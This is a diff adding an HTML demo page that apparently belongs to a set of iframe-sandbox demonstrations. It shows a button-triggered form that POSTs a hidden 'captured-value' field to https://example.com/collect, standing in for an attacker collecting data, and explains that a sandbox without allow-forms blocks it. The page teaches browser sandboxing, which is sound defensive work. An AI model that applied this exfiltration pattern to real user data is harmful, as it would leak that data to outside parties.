@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<title>cross-origin form POST</title>
+		<link rel="stylesheet" href="_style.css" />
+	</head>
+	<body>
+		<h1>4 — Cross-origin form POST</h1>
+		<p class="sub">
+			The embedded page submits a form to an external origin — e.g. shipping anything it collected
+			off to an attacker endpoint. Blocked by a <code>sandbox</code> without
+			<code>allow-forms</code>. Watch the Network tab for the POST.
+		</p>
+		<button onclick="go()">POST to example.com</button>
+		<form id="f" action="https://example.com/collect" method="POST" target="_blank">
+			<input type="hidden" name="field" value="captured-value" />
+		</form>
+		<div class="log" id="log">ready</div>
+		<p class="nav"><a href="index.html">&larr; all demos</a></p>
+		<script>
+			function go() {
+				document.getElementById('f').submit();
+				document.getElementById('log').textContent = 'form submitted (check Network tab)';
+			}
+		</script>
+	</body>
+</html>
